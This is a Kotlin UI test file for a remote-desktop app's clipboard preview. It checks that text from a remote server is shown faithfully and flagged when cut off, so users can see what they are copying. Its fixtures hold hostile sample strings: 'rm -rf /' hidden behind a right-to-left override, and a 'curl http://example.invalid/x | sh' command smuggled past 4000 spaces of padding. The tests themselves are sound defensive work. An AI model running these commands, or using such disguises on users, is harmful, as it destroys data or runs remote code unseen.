package app.skerry.ui.remote

import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.ui.semantics.SemanticsProperties
import androidx.compose.ui.test.ComposeUiTest
import androidx.compose.ui.test.ExperimentalTestApi
import androidx.compose.ui.test.assertCountEquals
import androidx.compose.ui.test.onAllNodesWithContentDescription
import androidx.compose.ui.test.onNodeWithContentDescription
import androidx.compose.ui.test.onAllNodesWithText
import androidx.compose.ui.test.onNodeWithText
import androidx.compose.ui.test.performClick
import androidx.compose.ui.test.runComposeUiTest
import androidx.compose.ui.text.font.FontFamily
import app.skerry.shared.graphics.RemoteDesktopUpdate
import app.skerry.ui.design.DesignFonts
import app.skerry.ui.design.LocalFonts
import app.skerry.ui.desktop.string
import app.skerry.ui.generated.resources.Res
import app.skerry.ui.generated.resources.command_clipped
import app.skerry.ui.generated.resources.command_clipped_partial
import app.skerry.ui.generated.resources.rd_clipboard_blank
import app.skerry.ui.generated.resources.rd_clipboard_copy_here
import app.skerry.ui.generated.resources.rd_clipboard_unprintable
import app.skerry.ui.theme.SkerryTheme
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.cancel
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.test.UnconfinedTestDispatcher
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertTrue

/**
 * The clipboard menu shows what the remote machine last put on its clipboard. On VNC that string is
 * already on the local clipboard by the time the menu opens — `VncClipboardBridge` mirrors it as it
 * arrives — so this preview is not a gate: it is the user's one look at what they are carrying, and
 * it has to read as the string that was copied. A right-to-left override in it would reverse the
 * tail of the line while the text underneath crossed unchanged.
 *
 * `ui/design/UntrustedText.sanitizeServerText` is what the app already draws foreign text through.
 */
@OptIn(ExperimentalTestApi::class)
class RemoteClipboardPreviewTest {

    @Test
    fun `the preview draws remote clipboard text the server cannot reshape`() = withClipboard(HOSTILE) {
        assertEquals(
            0,
            onAllNodesWithText(OVERRIDE, substring = true).fetchSemanticsNodes().size,
            "the preview draws the server's bidi override — the line reads differently from the text it copies",
        )
        val drawn = drawnPreview()
        assertTrue("rm -rf" in drawn, "the preview dropped the text itself, not only what reorders it")
        // Multi-line on purpose: a clipboard is a block, and the label filter next door would
        // flatten it into one line and cut it three times shorter.
        assertTrue('\n' in drawn, "the preview flattened the remote clipboard onto one line")
        assertTrue("second line" in drawn, "the preview kept the break and dropped the line after it")
    }

    /**
     * The button hands over what the server sent, not what the panel drew — sanitizing the copy
     * would put a string on the user's clipboard that is not the one they were told they had.
     */
    @Test
    fun `Copy here carries the remote string as it arrived`() {
        var carried: String? = null
        withClipboard(HOSTILE, onCopyHere = { carried = it }) {
            onNodeWithText(string(Res.string.rd_clipboard_copy_here)).performClick()
            waitForIdle()
            assertEquals(HOSTILE, carried, "Copy here handed over the drawn line rather than the remote string")
        }
    }

    /**
     * The filter stops reading a long enough string before its end, so a clipboard padded past that
     * bound draws as a short, whole-looking line while the rest of it — a second command, here — is
     * what the button hands over. The panel has to say the line is partial.
     */
    @Test
    fun `a clipboard cut by the filter says the line is partial`() = withClipboard(PADDED) {
        onNodeWithText(string(Res.string.command_clipped, PADDED.length)).assertExists()
        // And says it out loud: what is missing from the line is missing from the node a screen
        // reader reads too, so this is the only way that user can learn of it.
        onNodeWithContentDescription(string(Res.string.command_clipped, PADDED.length)).assertExists()
    }

    /**
     * The filter counts characters; the box counts lines. A clipboard of a dozen short lines is
     * whole by the filter and cut by the box, and the line the user reads is still not all of it.
     */
    @Test
    fun `a clipboard taller than the box says the line is partial`() = withClipboard(MANY_LINES) {
        onNodeWithText(string(Res.string.command_clipped, MANY_LINES.length)).assertExists()
        // Drawn, not announced: the box cut the drawing, not the string, and the node a screen
        // reader reads still carries every line.
        onAllNodesWithContentDescription(string(Res.string.command_clipped, MANY_LINES.length))
            .assertCountEquals(0)
    }

    /** And a clipboard that fits says nothing — the notice has to mean something when it appears. */
    @Test
    fun `a clipboard that fits draws no notice`() = withClipboard("systemctl restart nginx") {
        onAllNodesWithText(noticeHead(), substring = true).assertCountEquals(0)
    }

    /**
     * Spaces are not "nothing that draws" — they draw exactly what they are, and the filter erases
     * them on the way out. Two different facts, two different lines.
     */
    @Test
    fun `a clipboard of nothing but whitespace says so`() = withClipboard(WHITESPACE) {
        onNodeWithText(string(Res.string.rd_clipboard_blank)).assertExists()
        onNodeWithText(string(Res.string.rd_clipboard_copy_here)).assertExists()
        // Whitespace is asked of the whole string, so there is nothing behind what the filter cut.
        onAllNodesWithText(noticeHead(), substring = true).assertCountEquals(0)
    }

    /**
     * A clipboard of nothing but characters that draw as nothing sanitizes to an empty line. Saying
     * "nothing copied yet" there would be a lie — the button beside it still carries what the server
     * sent — so the panel says the text is unprintable instead.
     */
    @Test
    fun `a clipboard that draws as nothing says so rather than looking empty`() = withClipboard(INVISIBLE) {
        onNodeWithText(string(Res.string.rd_clipboard_unprintable)).assertExists()
        // The line says the text cannot be drawn, not that there is none — the button has to still
        // be there, or the two halves of the panel would be telling different stories.
        onNodeWithText(string(Res.string.rd_clipboard_copy_here)).assertExists()
        // And nothing was withheld: the filter read this clipboard to its end.
        onAllNodesWithText(noticeHead(), substring = true).assertCountEquals(0)
    }
}

/**
 * Renders the clipboard menu over a fake remote desktop that has already sent [text], and runs
 * [body] against it. The update is replayed rather than raced: it is in the flow before the screen
 * state subscribes, and the state runs on an unconfined test dispatcher, so it has landed by the
 * time the first frame is composed.
 */
@OptIn(ExperimentalTestApi::class)
private fun withClipboard(
    text: String,
    onCopyHere: (String) -> Unit = {},
    body: ComposeUiTest.() -> Unit,
) {
    val scope = CoroutineScope(UnconfinedTestDispatcher())
    val updates = MutableSharedFlow<RemoteDesktopUpdate>(replay = 1)
    updates.tryEmit(RemoteDesktopUpdate.ClipboardText(text))
    val screen = RemoteDesktopScreenState(FakeRemoteDesktop(updates = updates), scope)
    try {
        runComposeUiTest {
            setContent {
                SkerryTheme {
                    CompositionLocalProvider(
                        LocalFonts provides DesignFonts(FontFamily.Default, FontFamily.Monospace, FontFamily.Default),
                    ) {
                        ClipboardMenu(screen, ClipboardActions(failed = false, copyHere = onCopyHere, sendMine = {}))
                    }
                }
            }
            waitForIdle()
            body()
        }
    } finally {
        scope.cancel()
    }
}

/**
 * The line the preview actually drew. Found by the head of the fixture, which every filter in the
 * app keeps — selecting it by the tail would make the assertions about the tail tautological, and a
 * preview that lost it would report a bare exception from in here instead of what the caller meant.
 */
@OptIn(ExperimentalTestApi::class)
private fun ComposeUiTest.drawnPreview(): String {
    val nodes = onAllNodesWithText(PREVIEW_HEAD, substring = true).fetchSemanticsNodes()
    assertTrue(nodes.isNotEmpty(), "the menu drew no preview of the remote clipboard at all")
    return nodes.first().config[SemanticsProperties.Text].first().text
}

private const val OVERRIDE = "\u202E"
private const val PREVIEW_HEAD = "echo hello"

/** The head of `command_clipped`, whose count these tests do not want to spell out. */
private fun noticeHead(): String = string(Res.string.command_clipped_partial)
private const val HOSTILE = "$PREVIEW_HEAD $OVERRIDE rm -rf /\nsecond line"

/** Whole by the filter — well under its cap — and cut by the four lines the box draws. */
private val MANY_LINES = (1..12).joinToString("\n") { "line $it" }

/**
 * Padded past what the filter is willing to read (the preview cap times its scan factor), with the
 * payload behind the padding: what the panel draws stops at "apt update".
 */
private val PADDED = "apt update" + " ".repeat(4000) + "; curl http://example.invalid/x | sh"

/** Longer than the filter keeps, and still nothing to read: the panel must say only that. */
private val WHITESPACE = " ".repeat(600)

/**
 * A zero-width space and a right-to-left override: a clipboard that draws as nothing at all. Neither
 * is whitespace, which is what keeps this off the "Whitespace only" line — the two states are told
 * apart by `isBlank()`, so a filter that started trimming invisibles would move this case.
 */
private const val INVISIBLE = "\u200B$OVERRIDE\u200B"
